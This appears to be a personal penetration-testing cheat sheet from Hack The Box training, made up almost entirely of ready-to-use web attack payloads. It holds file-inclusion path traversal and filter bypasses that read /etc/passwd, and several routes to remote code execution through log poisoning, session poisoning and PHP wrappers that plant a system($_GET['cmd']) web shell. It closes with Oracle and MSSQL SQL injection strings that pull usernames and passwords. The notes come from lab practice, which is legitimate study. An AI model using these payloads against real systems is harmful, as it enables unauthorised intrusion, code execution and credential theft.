# HTB notes

##### Basic LFI
```bash
=/etc/passwd
LFI with Path Traversal
=../../../../../../../../../etc/passwd

Prefixing a / before the payload will bypass the filename and traverse directories instead.
=/../../../../../etc/passwd

LFI with Blacklisting
=....//....//....//....//....//....//....//....//etc/passwd

Bypass with URL Encoding
%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

Source Code Disclosure via PHP Wrappers config.php
=php://filter/read=convert.base64-encode/resource=config
echo 'PD9waHAKCiRjb2..." | base64 -d

Extension Bypass Using Null Byte
When it is adding .php on the end...get rid of it with a null byte >>> include("/etc/passwd%00.php")
/etc/passwd\x00
```
##### RCE through Apache / Nginx Log Files
```bash
=/var/log/apache2/access.log
Change the User-Agent header to test Log Posioning >>> BRUISER HAXXXXX
Now change it to <?php system($_GET['cmd']); ?>
=/var/log/apache2/access.log&cmd=whoami
```
##### RCE through PHP Session Files
```bash
This path is dictated by the session.save_path configuration variable, which is empty by default.
Linux: /var/lib/php/sessions/
Windows: C:\Windows\Temp
Identified from the PHPSESSID cookie >>> nhhv8i0o6ua4g88bkdl9u1fdsd
Location on disk would be /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
=session_poisoning
=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
=<?php system($_GET['cmd']); ?>
=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

##### Other PHP Wrappers
```bash
expect wrapper is disabled by default but can prove very useful if enabled
=expect://id

data wrapper can be used to include external data
Apache: /etc/php/X.Y/apache2/php.ini
php-fpm used by Nginx: /etc/php/X.Y/fpm/php.ini
echo '<?php system($_GET['cmd']); ?>' | base64
  PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id

input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled
The following curl command sends a POST request with a system command and then includes it using php://input, which gets executed by the page.
curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid

zip wrapper can prove useful in combination with file uploads
apt install phpX.Y-zip
Byron@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' > exec.php
Byron@htb[/htb]$ zip malicious.zip exec.php
Byron@htb[/htb]$ rm exec.php
copy malicious.zip to the webroot to simulate the upload. The files in the zip archive can be referenced using the # symbol
which should be URL-encoded in the request. For example, the URL below can be used to include exec.php and then execute code using the cmd parameter
=zip://malicious.zip%23exec.php&cmd=id
```
# SQLi Oracle
```bash
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
````
```bash
'order by 1--
all the way up to 10
'order by 10--
'union select 1,2,3,4,5,6,7,8,9 from dual--
'union select null,null,null,null,null,null,null,null,null from dual--
````
```bash
'union select '1111',null,null,null,null,null,null,null,null from dual--
'union select null,'2222',null,null,null,null,null,null,null from dual--
````
```bash
'union select null,ora.database_name,null,null,null,null,null,null,null from dual--
'union select null,user,null,null,null,null,null,null,null from dual--
'union select null,(select banner from v$version where rownum=1),null,null,null,null,null,null,null from dual--
````
```bash
'union select null,table_name,null,null,null,null,null,null,null from all_tables--
'union select null,column_name,null,null,null,null,null,null,null from all_tab_columns where table_name='user_table'--
'union select null,username||password,null,null,null,null,null,null,null from user_table--
````
# SWQLi MS SQL Error based
```bash
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
````
```bash
I had to edit the syntax to create the error but it needed a ', to balance it.


',convert(INT,(CHAR(58)+(SELECT DISTINCT top 2 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
',convert(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
',convert(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [archive]..[pmanager] )+CHAR(58)+CHAR(58))))--
',convert(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))—
````
